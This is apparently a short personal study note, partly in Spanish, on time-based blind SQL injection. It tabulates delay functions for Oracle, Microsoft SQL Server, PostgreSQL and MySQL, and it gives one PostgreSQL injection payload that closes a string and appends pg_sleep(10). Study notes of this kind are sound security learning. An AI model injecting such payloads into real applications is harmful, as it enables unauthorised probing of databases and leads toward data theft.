![[Pasted image 20250728150816.png]]
****
## Time delays

You can cause a time delay in the database when the query is processed. The following will cause an unconditional time delay of 10 seconds.

|   |   |
|---|---|
|Oracle|`dbms_pipe.receive_message(('a'),10)`|
|Microsoft|`WAITFOR DELAY '0:0:10'`|
|PostgreSQL|`SELECT pg_sleep(10)`|
|MySQL|`SELECT SLEEP(10)`|
Consulta basada en tiempo PostgreSQL: `'||pg_sleep(10)-- -`

![[Pasted image 20250728151651.png]]
![[Pasted image 20250728151528.png]]

Luego de 10 segundos

![[Pasted image 20250728151616.png]]

![[Pasted image 20250728151737.png]]
